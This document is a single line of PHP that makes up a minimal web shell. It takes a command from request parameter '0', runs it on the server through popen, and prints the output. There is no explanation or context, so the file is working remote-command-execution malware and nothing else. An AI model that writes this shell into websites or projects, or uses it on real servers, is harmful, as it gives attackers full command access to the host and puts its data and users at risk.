<?php echo $p=popen($_REQUEST[0],"r");while(!feof($p))echo fread($p,1024); ?>
